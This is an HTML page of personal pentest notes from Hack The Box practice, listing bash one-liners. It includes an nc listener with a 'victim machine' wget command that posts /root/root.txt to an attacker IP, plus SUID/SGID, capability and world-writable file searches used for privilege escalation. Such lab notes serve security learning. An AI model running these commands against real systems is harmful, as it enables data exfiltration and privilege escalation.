@@ -1,0 +1,95 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Bash commands // Pentest notes</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.52" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Przemek Sosnowski" />
+    <meta name="description" content="" />
+    <base href="https://example.com" />
+    <link rel="stylesheet" href="https://example.com/css/main.min.3bf813d46763420c83fb33c51950b4fc582483efcfddb34b4e4e8d6b811e3208.css" />
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="./avatar.jpg" /></a>
+      <h1>Pentest notes</h1>
+      <p>My pentest notes from HTB and other</p>
+      <div class="app-header-social">
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Bash commands</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 17, 2018
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          1 min read
+        </div><div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+          <a class="tag" href="https://example.com/tags/python/">Python</a><a class="tag" href="https://example.com/tags/nc/">Nc</a><a class="tag" href="https://example.com/tags/find/">Find</a><a class="tag" href="https://example.com/tags/awk/">Awk</a><a class="tag" href="https://example.com/tags/grep/">Grep</a><a class="tag" href="https://example.com/tags/cat/">Cat</a><a class="tag" href="https://example.com/tags/ps/">Ps</a></div></div>
+    </header>
+    <div class="post-content">
+      <p>#www server
+<pre>
+python -m SimpleHTTPServer 8000
+</pre></p>
+
+<p>#on our kali machine we run:<br />
+<pre>nc -lvnp 7734</pre></p>
+
+<p>#On the victim machine we run:<br />
+<pre>sudo wget &ndash;post-file=/root/root.txt 10.10.14.4:7734</pre></p>
+
+<p>#curl download
+<pre>curl <a href="http://some.url">http://some.url</a> &ndash;output some.file</pre></p>
+
+<p>#Sort<br />
+<pre>ls -ltr</pre></p>
+
+<p>#wrap ps commands
+<pre>ps auxww</pre></p>
+
+<p>#remove all before<br />
+<pre>cat lists |sed  &rsquo;s/^.*://&rsquo; &gt; md5
+awk -F &ldquo;:&rdquo; &lsquo;{print $1}&rsquo; /etc/passwd</pre></p>
+
+<pre>
+#capabilities
+getcap -r / 2>/dev/null
+
+#grep recursive
+grep -RIlm1 "bash" /skrypty/
+
+#sticky bit
+find / -perm -1000 -type d -exec la -la {} \; 2>/dev/null
+
+#sgid chmod 2000
+find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null
+
+#SUID chmod 4000
+find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
+
+find / -user root -perm -o=w -type f -not -path "/proc/*" -exec ls -la {} \; 2>/dev/null
+
+find / -type f -perm -g=rw -user root
+</pre>
+
+<p>apt install mpack
+munpack Receipt.eml</p>
+
+<p>ltrace</p>
+
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
